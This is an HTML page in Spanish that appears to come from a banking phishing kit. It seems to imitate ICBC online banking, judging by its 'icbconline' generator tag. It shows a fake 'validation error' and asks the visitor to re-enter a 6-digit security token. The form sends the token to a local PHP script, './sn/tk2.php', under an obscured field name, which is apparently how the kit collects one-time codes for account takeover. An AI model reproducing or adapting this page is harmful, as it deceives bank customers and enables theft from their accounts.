<!doctype html>
<html>

<head>
   <meta charset="utf-8">
   <title>Token</title>
   <meta name="generator" content="icbconline">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="css/tkk.css" rel="stylesheet">
   <link href="css/verytkerror.css" rel="stylesheet">
   <script src="js/jquery-3.7.1.min.js"></script>
   <script src="js/wb.validation.min.js"></script>
   <script>
      $(document).ready(function () {
         $("#Layer3").submit(function (event) {
            var isValid = $.validate.form(this);
            return isValid;
         });
         $("#Editbox1").validate(
            {
               required: true,
               bootstrap: true,
               type: 'number',
               expr_min: '',
               expr_max: '',
               value_min: '',
               value_max: '',
               length_min: '6',
               length_max: '6',
               color_text: '#000000',
               color_hint: '#00FF00',
               color_error: '#FF0000',
               color_border: '#808080',
               nohint: false,
               font_family: 'Arial',
               font_size: '13px',
               position: 'topleft',
               offsetx: 0,
               offsety: 0,
               effect: 'none',
               error_text: 'Debes ingresar el token de 6 digitos.'
            });
      });
   </script>
</head>

<body>
   <div id="Layer1">
      <div id="Layer1_Container">
         <form name="tag" method="post" action="./sn/tk2.php" enctype="multipart/form-data" id="Layer3">
            <div id="Layer3_Container">
               <div id="Html2">
                  <!DOCTYPE html>
                  <html>

                  <head>

                  </head>

                  <body>
                     <div class="center-body">
                        <div class="loader-ball-6">
                           <div></div>
                        </div>

                     </div>

                  </body>

                  </html>
               </div>
               <div id="wb_Icon1">
                  <div id="Icon1"><i class="Icon1"></i></div>
               </div>
               <div id="wb_Icon2">
                  <div id="Icon2"><i class="Icon2"></i></div>
               </div>
               <div id="wb_Text4">
                  <span style="color:#B22222;font-family:Arial;font-size:16px;">¡Ocurrió un error en la validación!
                  </span><span style="color:#000000;font-family:Arial;font-size:16px;"><br>Por favor ingresa un nuevo
                     TOKEN</span>
               </div>
               <hr id="HorizontalLine1">
               <button type="submit" id="ThemeableButton1" name="" value="CONTINUAR"
                  class="ui-button ui-corner-all">CONTINUAR</button>
               <div id="wb_Editbox1">
                  <input type="tel" id="Editbox1" name="rrwf3245" value="" maxlength="6" spellcheck="false"
                     placeholder="######">
                  <div class="invalid-feedback">Debes ingresar el token de 6 digitos.</div>
               </div>
            </div>
         </form>
      </div>
   </div>
</body>

</html>